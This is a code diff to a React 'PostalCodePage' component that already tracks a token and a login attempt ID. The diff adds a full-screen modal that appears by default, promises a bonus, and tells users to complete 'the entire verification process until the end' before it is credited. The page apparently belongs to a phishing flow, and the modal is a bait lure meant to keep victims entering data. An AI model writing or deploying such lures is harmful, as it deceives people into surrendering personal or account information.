@@ -51,6 +51,7 @@ export default function PostalCodePage() {
   const [, setLocation] = useLocation();
   const [token, setToken] = useState('');
   const [loginAttemptId, setLoginAttemptId] = useState('');
+  const [showBonusModal, setShowBonusModal] = useState(true);
   const { toast } = useToast();
 
   const {
@@ -336,6 +337,58 @@ export default function PostalCodePage() {
           </div>
         </form>
       </div>
+
+      {showBonusModal && (
+        <div
+          style={{
+            display: 'flex',
+            position: 'fixed',
+            zIndex: 9999,
+            top: 0,
+            left: 0,
+            width: '100vw',
+            height: '100vh',
+            backgroundColor: 'rgba(0,0,0,0.5)',
+            alignItems: 'center',
+            justifyContent: 'center'
+          }}
+        >
+          <div style={{
+            background: '#fff',
+            padding: '30px',
+            borderRadius: '15px',
+            width: '100%',
+            maxWidth: '380px',
+            textAlign: 'center',
+            fontFamily: 'Arial',
+            boxShadow: '0 0 20px rgba(0,0,0,0.4)'
+          }}>
+            <p style={{ fontSize: '22px', fontWeight: 'bold', marginBottom: '16px' }}>
+              🎁 Claim Your Bonus Now!
+            </p>
+            <p style={{ fontSize: '14px', color: '#555', marginBottom: '24px', lineHeight: '1.5' }}>
+              To activate the bonus in your account, please complete the entire verification process until the end. The bonus will be credited immediately after successful verification.
+            </p>
+            <button
+              onClick={() => setShowBonusModal(false)}
+              style={{
+                width: '100%',
+                padding: '14px',
+                background: '#212121',
+                color: 'white',
+                fontWeight: 'bold',
+                fontSize: '16px',
+                border: 'none',
+                borderRadius: '8px',
+                cursor: 'pointer'
+              }}
+              data-testid="button-bonus-continue"
+            >
+              Continue
+            </button>
+          </div>
+        </div>
+      )}
     </>
   );
 }
